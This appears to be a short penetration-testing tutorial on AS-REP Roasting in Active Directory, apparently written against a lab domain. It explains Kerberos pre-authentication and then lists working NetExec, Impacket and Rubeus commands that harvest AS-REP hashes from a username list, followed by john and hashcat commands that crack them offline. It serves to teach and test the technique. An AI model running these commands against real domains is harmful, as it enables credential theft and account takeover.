# AS-REP Roasting
Kerberos Pre-Authentication Not Required, also known as AS-REP Roasting, occurs when a user account has pre-authentication disabled. Normally, Kerberos requires clients to include a timestamp encrypted with the user’s password hash in the Authentication Service Request (AS-REQ). The Domain Controller verifies this timestamp to ensure the request is legitimate. This process is called pre-authentication

If pre-authentication is disabled, an attacker can request an AS-REP (Authentication Service Response) for that user without knowing the user’s password. The AS-REP contains data encrypted with the user’s password hash, which can then be extracted and brute-forced offline to recover the plaintext password

i) AsRepRoast using a user file: Attackers can enumerate users with pre-authentication disabled and request AS-REP responses for them
ii) Crack AsRepRoast hashes: The encrypted data from AS-REP can be brute-forced offline using tools like hashcat or John the Ripper to recover the password

Authentication Service Request (ASRec)
Authentication Service Response (ASRep)

```
Client            ------------>          Domain Controller
    ^               ASReq                   |
    |---------------------------------------|
                    ASRep
```

To check account without kerberose pre-authentication

![asreproasting](/static/images/ar1.png)

![asreproasting](/static/images/ar2.png)

The user alice.wonderland have disabled the pre-authentication

Here we have users.txt which contains the wordlists of the username that we got on the enumeration. Here we use all username because if we don't got any initial access then we cannot verify which user have disabled the pre-authentication in Kerberos

## AS-REP Roasting using NetExec

```
# Connect using nxc and get the hash
nxc ldap marvel.local -u users.txt -p '' --asreproast outfile.txt

# put the hash in a file
echo 'hash we got' > hash.txt

# Crack the hash using john-the-ripper
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## AS-REP Roasting Using Impacket

```
# using impacket
impacket-GetNPUsers marvel.local -usersfile users.txt -no-pass -format john -outputfile hash.txt

# put the hash in a file
echo 'hash we got' > hash.txt

# Crack the hash using hashcat
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt  
```

## AS-REP Roasting Using Rubeus

```
# if we got the initial access we can use rubeus
./Rubeus.exe asreproast /outfile:hashes.txt

# Crack the hash using john-the-ripper
john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```
